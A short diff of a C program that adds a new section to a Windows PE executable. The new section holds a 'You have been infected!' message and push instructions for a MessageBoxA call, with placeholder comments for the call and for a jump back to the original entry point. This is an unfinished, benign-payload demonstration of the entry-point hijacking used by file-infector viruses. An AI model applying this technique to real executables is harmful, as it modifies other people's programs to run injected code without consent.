@@ -97,6 +97,27 @@ int main(int argc, char *argv[]) {
 			// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
 	};
 
+	// Adding new section
+	fseek(fr, 0, SEEK_END);
+	const long old_end = ftell(fr);
+	const long newsh_addr = closest(old_end+1,imageOptionalHeader.SectionAlignment);
+	const char *msgCaption = "Notice";
+	const char *msgText = "You have been infected!";
+
+	pad(fa, newsh_addr - old_end);
+	// Should be written at newsh_addr
+	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
+	// Should be written at newsh_addr + strlen(msgCaption) + 1
+	fwrite(msgText, strlen(msgText)+1, 1, fa);
+	instruct(fa, 0x68, 0x1030);
+	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newsh_addr);
+	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newsh_addr + strlen(msgCaption) + 1);
+	instruct(fa, 0x6a, 0);
+
+	// Call MessageBoxA
+
+	// Jmp back to old AddressOfEntryPoint
+
 	setval_char(fr, newish.Name,8, SEEK_SET, newish_addr);
 	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
 	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
